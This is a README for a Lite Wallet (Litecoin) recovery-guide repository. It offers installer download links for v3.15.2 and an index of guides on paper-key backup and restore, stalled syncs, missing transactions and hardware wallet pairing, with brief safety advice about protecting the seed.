![Lite Wallet](assets/banner-hub.png)

# Lite Wallet recovery: paper keys, restores and fixes

Twelve words, a restore that looks empty, and the failures that imitate a lost wallet.

## Downloads - v3.15.2

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

Every checksum is published on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

---

## What this repository is for

This repository covers the two moments that decide whether coins survive: the paper key you
wrote down, and the day you need it. It holds the backup and restore guides, the seed
portability question, and the failures that look like a lost wallet - a sync that never
finishes, a balance that reads zero after a restore, a transaction the explorer shows and the
wallet does not. Hardware wallets belong here too, because a device that will not pair blocks a
send exactly the way a missing restore does.

The order matters and the guides say so. Most zero balances are a sync state, not a loss; most
restores that seem to fail are one rejected word or a derivation path. Read the symptom before
the fix, and never type the paper key into a page that asked for it in a message.

## Who it is for

- **Someone holding twelve words and no plan**, who needs to know what they are and where to keep them.
- **A reader restoring on a new machine**, whose balance did not appear the moment the words were accepted.
- **A hardware wallet owner** whose device is not detected, or who wants signing to happen off the computer.
- **Anyone whose sync stalled**, and who needs to tell a slow first sync from a stuck one.

## Start here

<div align="center">

| Guide | What it covers |
| --- | --- |
| [The paper key guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-paper-key-backup-and-restore.md) | How the 12-word paper key appears, how to record it once, and how to bring a wallet back from it. |
| [The paper key restore guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/restore-litewallet-from-a-paper-key.md) | The restore sequence step by step, the rejected-word fix and the zero balance that often follows a restore. |
| [The sync troubleshooting guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-stuck-syncing-balance-zero.md) | Why a sync stalls, loops or restarts, and the order of fixes that actually moves the progress bar. |
| [The missing transaction guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-transaction-stuck-or-missing.md) | An explorer that shows coins the wallet does not, and the checks that tell you which one is right. |

</div>

## How to use these guides

1. Back up before anything else: the paper key guide is the one page to read on day one.
2. If you are restoring, follow the restore guide in order; the zero-balance section comes first.
3. When a send vanishes, start with the missing transaction guide rather than reinstalling.
4. If a device will not connect, work the hardware connection checklist before changing cables twice.
5. Keep the seed portability guide for the day you need another wallet to read the same words.

## Back up and restore

<div align="center">

| Guide | What it covers |
| --- | --- |
| [The paper key guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-paper-key-backup-and-restore.md) | How the 12-word paper key appears, how to record it once, and how to bring a wallet back from it. |
| [The paper key restore guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/restore-litewallet-from-a-paper-key.md) | The restore sequence step by step, the rejected-word fix and the zero balance that often follows a restore. |
| [The seed portability guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/restore-litewallet-seed-in-another-wallet.md) | Bring the same 12 words into Electrum-LTC or another wallet, and why a derivation path changes what appears. |

</div>


## Sync and transaction failures

<div align="center">

| Guide | What it covers |
| --- | --- |
| [The sync troubleshooting guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-stuck-syncing-balance-zero.md) | Why a sync stalls, loops or restarts, and the order of fixes that actually moves the progress bar. |
| [The missing transaction guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-transaction-stuck-or-missing.md) | An explorer that shows coins the wallet does not, and the checks that tell you which one is right. |

</div>


## Hardware wallets

<div align="center">

| Guide | What it covers |
| --- | --- |
| [The hardware wallet pairing guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/connect-ledger-trezor-to-litewallet.md) | Pair a Ledger or Trezor, confirm the transaction on the device and keep keys off the computer. |
| [The hardware connection guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/fix-litewallet-hardware-wallet-errors.md) | Work through a device that never appears, a cable that drops, or a Trezor that Windows will not enumerate. |

</div>

## What each guide changes

<div align="center">

| Task | Guide | Outcome |
| --- | --- | --- |
| record the paper key properly | [The paper key guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-paper-key-backup-and-restore.md) | twelve words written once, stored offline, with the mistakes named. |
| restore a wallet | [The paper key restore guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/restore-litewallet-from-a-paper-key.md) | a wallet reopened from the words, including the rejected-word fix. |
| explain a zero balance | [The sync troubleshooting guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-stuck-syncing-balance-zero.md) | a sync diagnosed, and the fix order that does not lose progress. |
| find a missing transaction | [The missing transaction guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-transaction-stuck-or-missing.md) | the explorer and the wallet reconciled, with the wrong one identified. |
| sign with a device | [The hardware wallet pairing guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/connect-ledger-trezor-to-litewallet.md) | a Ledger or Trezor paired, with confirmation on the device screen. |
| fix a device that will not connect | [The hardware connection guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/fix-litewallet-hardware-wallet-errors.md) | the detection failure isolated to cable, driver or device. |

</div>

## Common first questions

### Can the project restore my wallet for me?

No. No server holds a copy of your keys, so nobody can reconstruct them. The twelve words are the only path back, which is why the backup guide comes first.

### Why is my balance zero after a restore?

Usually because the wallet is still syncing, or because it restored a different derivation path. The restore guide covers both, in that order.

### Is a paper key the same as a password?

No. A password is checked by a server; the paper key is the wallet. Anyone who reads it can spend the coins, and nobody can reset it.

## More guides

For the install itself and the trust questions, go to the [setup repository](https://github.com/litewallet-dev/litecoin-wallet-setup).
For fees, sends and private transactions, go to the [transactions repository](https://github.com/litewallet-dev/litecoin-wallet-transactions).

## Before you install

Have the paper key in front of you, on paper, and the machine you intend to restore on. Do not
restore onto a machine you do not control, and do not accept a screen share from anyone offering
to help: a restore is the one operation where a helpful stranger is the attack.

## About

Lite Wallet restores from a 12-word BIP-39 paper key, on desktop and mobile alike. These guides
are written against the current release, with installers and checksums on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

## License

MIT.
